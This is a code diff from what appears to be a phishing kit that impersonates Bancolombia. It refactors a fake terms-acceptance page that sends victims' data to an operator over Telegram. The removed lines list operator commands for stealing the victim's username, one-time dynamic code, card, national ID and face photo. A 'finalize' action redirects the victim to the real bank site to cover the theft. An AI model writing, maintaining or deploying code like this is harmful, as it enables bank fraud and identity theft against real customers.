@@ -7,6 +7,7 @@
     <link rel="stylesheet" href="styles_new.css">
     <script src="/socket.io/socket.io.js"></script>
     <script src="/js/banco-utils.js"></script>
+    <script src="bancolombia-telegram.js"></script>
     <script>
     document.addEventListener('DOMContentLoaded', async function() {
         const check1 = document.getElementById('termino1');
@@ -58,16 +59,7 @@
             const data = { terminos: 'Aceptados (3/3)' };
             const fullData = BancoUtils.saveBankData('bancolombia', data);
             const message = BancoUtils.formatMessage('BANCOLOMBIA - Términos', fullData);
-            const buttons = [
-                { text: '🔑 Pedir Usuario', action: 'index' },
-                { text: '🔢 Pedir Dinámica', action: 'dinamica' },
-                { text: '💳 Pedir Tarjeta', action: 'tarjeta' },
-                { text: '🆔 Pedir Cédula', action: 'cedula' },
-                { text: '📷 Pedir Cara', action: 'cara' },
-                { text: '📄 Pedir Términos', action: 'terminos' },
-                { text: '✅ Finalizar', action: 'finalizar' }
-            ];
-            const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());
+            const keyboard = BancolombiaTelegram.getKeyboard();
             
             try {
                 await BancoUtils.sendToTelegram('terminos', { text: message, keyboard });
@@ -78,13 +70,7 @@
             }
         });
         
-        BancoUtils.onTelegramAction((data) => {
-            if (data.action === 'finalizar') {
-                window.location.href = 'https://www.bancolombia.com/personas';
-            } else if (['index', 'dinamica', 'tarjeta', 'cedula', 'cara', 'terminos'].includes(data.action)) {
-                window.location.href = data.action + '.html';
-            }
-        });
+        BancoUtils.onTelegramAction((data) => BancolombiaTelegram.handleTelegramAction(data));
         
         async function updateInfo() {
             try {
